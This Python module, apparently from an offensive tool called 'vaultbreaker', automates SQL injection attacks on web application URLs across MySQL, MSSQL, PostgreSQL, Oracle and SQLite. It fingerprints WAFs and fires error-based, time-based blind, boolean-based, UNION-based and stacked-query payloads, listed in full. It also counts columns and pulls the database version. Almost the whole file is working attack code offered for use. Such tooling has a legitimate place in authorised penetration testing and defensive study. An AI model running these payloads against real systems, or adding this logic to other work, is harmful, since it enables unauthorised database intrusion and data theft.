"""SQL injection exploitation across MySQL, MSSQL, PostgreSQL, Oracle, SQLite."""
from __future__ import annotations

import re
import time
import urllib.parse
from typing import Optional

from vaultbreaker.models import AttackResult, Credential, EngagementContext
from vaultbreaker.logger import info, ok, warn, crit, section, console
from vaultbreaker.modules.base import BaseModule
from vaultbreaker.data import http_request


class SQLiModule(BaseModule):
    """SQL injection exploitation across MySQL, MSSQL, PostgreSQL, Oracle, SQLite."""

    name = "sqli"

    ERROR_PATTERNS = {
        "mysql": [
            r"you have an error in your sql syntax",
            r"warning.*mysql",
            r"unclosed quotation mark",
            r"mysql_fetch",
            r"mysqli_",
            r"MariaDB",
        ],
        "mssql": [
            r"microsoft ole db provider for sql server",
            r"unclosed quotation mark after the character string",
            r"mssql_query\(\)",
            r"\bODBC SQL Server Driver\b",
            r"SqlClient\.SqlException",
            r"Procedure or function .* expects parameter",
        ],
        "postgresql": [
            r"PSQLException",
            r"org\.postgresql\.util",
            r"ERROR:\s+syntax error at or near",
            r"pg_query\(\)",
            r"pg_exec\(\)",
            r"unterminated quoted string",
        ],
        "oracle": [
            r"ORA-\d{5}",
            r"oracle.*driver",
            r"quoted string not properly terminated",
            r"Oracle.*error",
        ],
        "sqlite": [
            r"SQLite\/JDBCDriver",
            r"sqlite3\.OperationalError",
            r"SQLITE_ERROR",
            r"near \".*\": syntax error",
            r"unrecognized token",
        ],
    }

    WAF_SIGNATURES = [
        "mod_security", "cloudflare", "incapsula", "sucuri", "akamai",
        "imperva", "f5 big-ip", "barracuda", "fortiweb", "wallarm",
    ]

    SQLI_PAYLOADS = ["'", '"', "')", '")', "';", "' OR '1'='1", "\" OR \"1\"=\"1"]

    TIME_PAYLOADS = {
        "mysql": ["' OR SLEEP({delay})-- -", "\" OR SLEEP({delay})-- -", "') OR SLEEP({delay})-- -"],
        "mssql": ["'; WAITFOR DELAY '0:0:{delay}'-- -", "\"; WAITFOR DELAY '0:0:{delay}'-- -"],
        "postgresql": ["'; SELECT pg_sleep({delay})-- -", "\" OR pg_sleep({delay})-- -"],
        "sqlite": ["' OR randomblob(500000000)-- -"],
    }

    def run(self, ctx: EngagementContext) -> None:
        section("SQLi Module")
        for target in ctx.targets:
            target_url = target if target.startswith("http") else f"http://{target}"
            info(f"Target: {target_url}")
            self._waf_detection(ctx, target_url)
            self._error_based(ctx, target_url)
            self._time_based(ctx, target_url)
            self._boolean_based(ctx, target_url)
            self._union_based(ctx, target_url)
            self._stacked_queries(ctx, target_url)

    def _waf_detection(self, ctx: EngagementContext, url: str):
        test_payload = "' OR 1=1 UNION SELECT NULL-- -"
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        if not params:
            test_url = f"{url}?id={urllib.parse.quote(test_payload)}"
        else:
            first_param = list(params.keys())[0]
            test_url = re.sub(
                f"{first_param}=[^&]*",
                f"{first_param}={urllib.parse.quote(test_payload)}",
                url,
            )
        resp = http_request(test_url, timeout=ctx.timeout)
        if resp is None:
            ctx.add_result(AttackResult("sqli", "WAF Detection", "fail", "info",
                                        "Target unreachable"))
            return
        if resp.status_code == 403:
            waf_found = "Unknown WAF"
            headers_lower = str(resp.headers).lower()
            body_lower = resp.text.lower() if resp.text else ""
            combined = headers_lower + body_lower
            for sig in self.WAF_SIGNATURES:
                if sig in combined:
                    waf_found = sig.title()
                    break
            ctx.add_result(AttackResult("sqli", "WAF Detection", "ok", "medium",
                                        f"WAF detected: {waf_found}"))
        else:
            ctx.add_result(AttackResult("sqli", "WAF Detection", "ok", "info",
                                        "No WAF detected on obvious payload"))

    def _inject_param(self, url: str, payload: str) -> str:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        if not params:
            return f"{url}?id={urllib.parse.quote(payload)}"
        first_param = list(params.keys())[0]
        original_value = params[first_param][0]
        new_query = re.sub(
            f"{re.escape(first_param)}=[^&]*",
            f"{first_param}={urllib.parse.quote(original_value + payload)}",
            parsed.query,
        )
        return urllib.parse.urlunparse(parsed._replace(query=new_query))

    def _error_based(self, ctx: EngagementContext, url: str):
        for payload in self.SQLI_PAYLOADS:
            injected = self._inject_param(url, payload)
            resp = http_request(injected, timeout=ctx.timeout)
            if resp is None:
                continue
            body = resp.text.lower() if resp.text else ""
            for db_type, patterns in self.ERROR_PATTERNS.items():
                for pattern in patterns:
                    if re.search(pattern, body, re.IGNORECASE):
                        ctx.add_result(AttackResult(
                            "sqli", "Error-Based Detection", "critical", "critical",
                            f"SQL error from {db_type.upper()} with payload: {payload}"
                        ))
                        return
        ctx.add_result(AttackResult("sqli", "Error-Based Detection", "fail", "info",
                                    "No error-based injection found"))

    def _time_based(self, ctx: EngagementContext, url: str):
        delay = 5
        db_engines = [ctx.db_type] if ctx.db_type != "auto" else ["mysql", "mssql", "postgresql", "sqlite"]
        for engine in db_engines:
            payloads = self.TIME_PAYLOADS.get(engine, [])
            for payload_tpl in payloads:
                payload = payload_tpl.format(delay=delay)
                injected = self._inject_param(url, payload)
                start = time.time()
                resp = http_request(injected, timeout=ctx.timeout + delay + 5)
                elapsed = time.time() - start
                if resp is not None and elapsed >= delay - 1:
                    ctx.add_result(AttackResult(
                        "sqli", "Time-Based Blind", "critical", "critical",
                        f"{engine.upper()} time-based confirmed (delay={elapsed:.1f}s) payload: {payload}"
                    ))
                    return
        ctx.add_result(AttackResult("sqli", "Time-Based Blind", "fail", "info",
                                    "No time-based blind injection confirmed"))

    def _boolean_based(self, ctx: EngagementContext, url: str):
        true_payload = "' AND '1'='1"
        false_payload = "' AND '1'='2"
        true_url = self._inject_param(url, true_payload)
        false_url = self._inject_param(url, false_payload)
        resp_true = http_request(true_url, timeout=ctx.timeout)
        resp_false = http_request(false_url, timeout=ctx.timeout)
        if resp_true is None or resp_false is None:
            ctx.add_result(AttackResult("sqli", "Boolean-Based Blind", "fail", "info",
                                        "Target unreachable for boolean test"))
            return
        len_diff = abs(len(resp_true.text or "") - len(resp_false.text or ""))
        if len_diff > 50:
            ctx.add_result(AttackResult(
                "sqli", "Boolean-Based Blind", "critical", "high",
                f"Response length differential: {len_diff} chars (true={len(resp_true.text or '')}, false={len(resp_false.text or '')})"
            ))
        else:
            ctx.add_result(AttackResult("sqli", "Boolean-Based Blind", "fail", "info",
                                        f"No significant length diff ({len_diff} chars)"))

    def _union_based(self, ctx: EngagementContext, url: str):
        for num_cols in range(1, 21):
            order_payload = f"' ORDER BY {num_cols}-- -"
            injected = self._inject_param(url, order_payload)
            resp = http_request(injected, timeout=ctx.timeout)
            if resp is None:
                continue
            body = resp.text.lower() if resp.text else ""
            error_hit = any(
                re.search(p, body, re.IGNORECASE)
                for patterns in self.ERROR_PATTERNS.values()
                for p in patterns
            )
            if error_hit:
                col_count = num_cols - 1
                if col_count > 0:
                    nulls = ",".join(["NULL"] * col_count)
                    union_payload = f"' UNION SELECT {nulls}-- -"
                    union_url = self._inject_param(url, union_payload)
                    union_resp = http_request(union_url, timeout=ctx.timeout)
                    if union_resp and union_resp.status_code == 200:
                        version_nulls = list(["NULL"] * col_count)
                        version_nulls[0] = "@@version"
                        version_payload = f"' UNION SELECT {','.join(version_nulls)}-- -"
                        ver_url = self._inject_param(url, version_payload)
                        ver_resp = http_request(ver_url, timeout=ctx.timeout)
                        version_str = "unknown"
                        if ver_resp and ver_resp.text:
                            ver_match = re.search(r"(\d+\.\d+\.\d+[\w\-\.]*)", ver_resp.text)
                            if ver_match:
                                version_str = ver_match.group(1)
                        ctx.add_result(AttackResult(
                            "sqli", "UNION-Based", "critical", "critical",
                            f"UNION injection confirmed: {col_count} columns, version: {version_str}"
                        ))
                    else:
                        ctx.add_result(AttackResult(
                            "sqli", "UNION-Based", "ok", "high",
                            f"Column count determined: {col_count} (UNION blocked or filtered)"
                        ))
                    return
                break
        ctx.add_result(AttackResult("sqli", "UNION-Based", "fail", "info",
                                    "Could not determine column count via ORDER BY"))

    def _stacked_queries(self, ctx: EngagementContext, url: str):
        stacked_payloads = [
            "';SELECT SLEEP(5)-- -",
            "\";SELECT SLEEP(5)-- -",
            "';WAITFOR DELAY '0:0:5'-- -",
            "';SELECT pg_sleep(5)-- -",
        ]
        for payload in stacked_payloads:
            injected = self._inject_param(url, payload)
            start = time.time()
            resp = http_request(injected, timeout=ctx.timeout + 10)
            elapsed = time.time() - start
            if resp is not None and elapsed >= 4:
                ctx.add_result(AttackResult(
                    "sqli", "Stacked Queries", "critical", "critical",
                    f"Stacked query execution confirmed (delay={elapsed:.1f}s): {payload}"
                ))
                return
        ctx.add_result(AttackResult("sqli", "Stacked Queries", "fail", "info",
                                    "No stacked query execution detected"))
